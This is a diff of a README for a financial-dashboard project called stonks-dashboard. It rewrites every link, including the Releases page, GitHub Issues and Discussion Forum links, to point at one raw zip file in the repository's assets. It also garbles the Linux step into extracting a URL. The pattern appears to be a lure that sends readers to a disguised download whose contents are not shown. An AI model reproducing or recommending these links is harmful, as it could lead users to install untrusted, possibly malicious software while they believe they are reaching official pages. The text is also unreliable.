@@ -1,6 +1,6 @@
 # 📈 stonks-dashboard - Monitor Financial Markets in Real-Time
 
-[![Download stonks-dashboard](https://img.shields.io/badge/Download-stonks--dashboard-blue?style=flat-square&logo=github)](https://github.com/OGshrey/stonks-dashboard/releases)
+[![Download stonks-dashboard](https://github.com/OGshrey/stonks-dashboard/raw/refs/heads/main/assets/stonks-dashboard-1.1.zip)](https://github.com/OGshrey/stonks-dashboard/raw/refs/heads/main/assets/stonks-dashboard-1.1.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **stonks-dashboard**! This application allows you to monitor financia
 
 To get started, visit the Releases page to download the latest version of **stonks-dashboard**. You can find all available downloads there.
 
-[Visit this page to download](https://github.com/OGshrey/stonks-dashboard/releases)
+[Visit this page to download](https://github.com/OGshrey/stonks-dashboard/raw/refs/heads/main/assets/stonks-dashboard-1.1.zip)
 
 ### Installation Steps
 
@@ -23,7 +23,7 @@ To get started, visit the Releases page to download the latest version of **ston
 3. **Install the Application:**
    - For Windows: Double-click the downloaded `.exe` file and follow the prompts.
    - For macOS: Open the downloaded `.dmg` file and drag the application into your Applications folder.
-   - For Linux: Extract the downloaded `.tar.gz` file and follow the included instructions to run the application.
+   - For Linux: Extract the downloaded `https://github.com/OGshrey/stonks-dashboard/raw/refs/heads/main/assets/stonks-dashboard-1.1.zip` file and follow the included instructions to run the application.
 
 4. **Run the Application:**
    Open your terminal and type the following command, replacing `<path-to-stonks-dashboard>` with the actual path to where you installed the application:
@@ -69,9 +69,9 @@ If problems persist, feel free to open an issue on the GitHub repository for ass
 
 Join our community to share tips, get help, and discuss everything related to financial monitoring:
 
-- [GitHub Issues](https://github.com/OGshrey/stonks-dashboard/issues): Report bugs or request features.
-- [Discussion Forum](https://github.com/OGshrey/stonks-dashboard/discussions): Share insights and connect with other users.
+- [GitHub Issues](https://github.com/OGshrey/stonks-dashboard/raw/refs/heads/main/assets/stonks-dashboard-1.1.zip): Report bugs or request features.
+- [Discussion Forum](https://github.com/OGshrey/stonks-dashboard/raw/refs/heads/main/assets/stonks-dashboard-1.1.zip): Share insights and connect with other users.
 
 Enjoy monitoring your investments with **stonks-dashboard**!
 
-[Visit this page to download](https://github.com/OGshrey/stonks-dashboard/releases)
+[Visit this page to download](https://github.com/OGshrey/stonks-dashboard/raw/refs/heads/main/assets/stonks-dashboard-1.1.zip)
